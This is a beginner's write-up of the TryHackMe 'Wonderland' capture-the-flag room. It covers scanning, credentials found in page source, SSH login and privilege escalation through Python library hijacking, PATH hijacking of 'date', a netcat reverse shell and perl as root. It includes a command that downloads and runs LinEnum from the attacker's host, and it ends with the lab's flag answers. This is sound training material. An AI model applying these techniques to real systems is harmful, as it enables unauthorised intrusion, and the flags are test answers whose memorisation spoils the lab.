@@ -1,0 +1,172 @@
+Wonderland Tryhackme Writeup:
+
+''''''''''''''''''''''''''''''''''''''
+	    SCANS AND ENUMERATION
+
+''''''''''''''''''''''''''''''''''''''
+
+I always start with a basic portscan, so something like NMAP works great. However, I like to use Rustscan instead. I've found that it is much faster, and allows me to get a quick overview of what I'm looking at. Then, I use NMAP to further enumerate interesting services.
+
+Lets run the scan
+rustscan -a 10.10.36.75 -b 65335
+
+-a = addresses
+-b = ports to scan
+
+		Rustscan Output
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+Looks like SSH is open, and there is a webserver running.
+
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+Lets start a Gobuster and Nikto scan. While those are running. Lets take a look at the webpage.
+
+Gobuster - This is a website directory scanner. Essentially, it bruteforces common directories that websites use until it gets a response back. This is really useful for enumeration, because we can get a good idea of the layout of the webpages, so lets get that started
+
+gobuster dir -u http://<ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,cgi,html,xss,png,js
+
+-u = the host we are scanning
+-w = The wordlist we are going to use. Kali comes with a lot of good wordlists
+-x = different types of file extensions to look for
+
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+Nikto - This is a web application scanner, and is extemely useful to find interesting paths to explore on the webpage
+
+Nikto -h <ip>
+
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+														WEBPAGE NAVIGATION
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+While these scans are running, lets take a closer look at the webpage we are presented with.
+
+There doesn't appear to be much, so lets take a look at the source code. This can potentially provide us with useful information.
+
+Nothing useful there. Lets take a look at our Gobuster, and Nikto scans, and see if they've found anything.
+
+So it looks like Gobuster found an interesting directory called /r. Lets navigate to this directory, and see if there is anything there.
+
+Looks like it takes us to a page with more cryptic text on it. One thing that stuck out to me was it says "Keep Going."
+
+Lets do some further GoBuster enumeration on this subdirectory, and see if it leads anywhere...
+
+Would you look at that! It looks like it leads down a literal rabbit hole with the subdirectories. Now, where do we go from here?
+
+										r/a/b/b/i/t
+
+Well, lets start by looking at the source code of this final page, and see what we see.
+
+Something interesting here:
+alice:HowDothTheLittleCrocodileImproveHisShiningTail
+
+My first thought is this is a username, and password, but to what? Well, remember that the SSH port was open, so, lets try this out and see what happens.
+
+										ssh alice@<ip>
+										Password HowDothTheLittleCrocodileImproveHisShiningTail
+
+
+It worked! We are now logged in as Alice. Lets look around the system, and see if we can find anything interesting.
+
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+											PRIVILAGE ESCALATION
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+First thing I noticed was the "root.txt" in the intial filesystem. I tried to cat it out on screen, but obviously permission was denied. The second thing I saw was the "walrus_and_the_carpenter.py" file. That was interesting to me.
+
+First, I want to start off by running "sudo -l" this is a good way to check the permissions of a filesystem and see if there is any potential vector for escalation within the system.
+
+It looks like we can run that Python file as the user "Rabbit." Good to know, but for good measure, I'm going to get LinEnum onto this machine.
+
+To do this, I hosted a Simple Python Webserver - on my host machine, and used the wget command to download LinEnum to the remote machine. Then, I used chmod +x LinEnum.sh to make the file executable, and then ran it.
+
+											python -m SimpleHTTPServer (Host Machine)
+											wget http://<LHOST>:<LPORT>/LinEnum.sh (Remote Machine)
+											chmod +x LinEnum.sh
+											./LinEnum.sh
+
+So one thing I found interesting in the LinEnum scan was the fact that Perl can be run by Hatter. However, I think I want to focus on the Python script, and try to switch over the the user Rabbit.
+
+Lets try and fiddle around with that Python script, and see if we can find a way to get it to point to a reverse shell we have on our host machine.
+
+So I won't lie on this one, I needed some help figuring out what to do. I'm still new to this. 
+
+Now, I'm okay with Python, but in this context, I ended trying too hard. I tried to point the initial script to a reverse shell on my own system. After many failed attempts. I figured out that I could simply create a new .py file in the home directory with this code:
+
+Import os
+os.system("/bin/bash")
+
+This is because Python uses the libraries that are in your home directory.
+
+Then, simply take the path for the user Rabbit, run the walrus and carpenter file as them, and I was able to spawn a terminal as Rabbit.
+
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+														LOGGING IN AS HATTER
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+Again, I felt a little bit out of my depth, but this time I was able to successfully figure it out.
+
+First, I navigated to Rabbits home directory, and found a strange file entitled "teaParty" Upon running this file, a text screen came up, and then exited. This was strange to me and I was stuck for a little bit. However, after some research, I decided to download the file onto my host machine and run "strings." I found that the variable for "date" wasn't using the full path, and was potentially exploitable. 
+
+This led me to create my own directory with a "date" file in it. Then, I redirected the program to use my newly created malicious date file.
+
+This malicious date file spawned Bin/Bash
+
+Then, I fired up a reverse shell through netcat on my host machine, and be Hatter.
+
+Then, I was able to navigate to Hatters directory, and extract the password they used to log in. Then, I used su hatter, and logged in as them, so I could get the proper ID's.
+
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+														ESCALATING TO ROOT
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+Now, I need to find a way to escalate my privilages even further. Luckily, when I ran my LinEnum scan on the machine, I found that Hatter can actually run "perl" as root.
+
+Off to GTFOBins to see if there is a way to spawn the root terminal with Perl.
+
+I tried all of the commands on GTFOBins, and found the one under "capabilities" worked.
+
+Now I'm root! Now its only a matter of finding the two flags!
+
+I navigated to the root directory, and found user.txt
+Then, the root.txt is in Alices directory.
+
+If you somehow found this - and read it - Thank you so much for reading. I'm still pretty new to cyber security, and CTF's so there are probably a couple of things I could have done better. I am pretty proud of myself that I only needed to look up one thing - The Python thing - Other than that, I was able to fumble my way through.
+
+Answers are at the bottom. However, I encourage you not to look, until you are absolutely lost. You may surprise yourself like I did :)
+
+Also, sorry there are no pictures. Next time, I'll take some screenshots.
+
+
+
+
+
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+													ANSWERS
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+
+
+Question 1:
+
+''''''''''''''''''''''''''''
+Obtain the flag in user.txt
+
+THM{"Curiouser and curiouser!"}
+
+''''''''''''''''''''''''''''
+
+Question 2:
+
+''''''''''''''''''''''''''''
+Escalate your privileges, what is the flag in root.txt?
+
+THM{Twinkle, twinkle, little bat! How I wonder what you're at!}
+
+''''''''''''''''''''''''''''
+
+
+
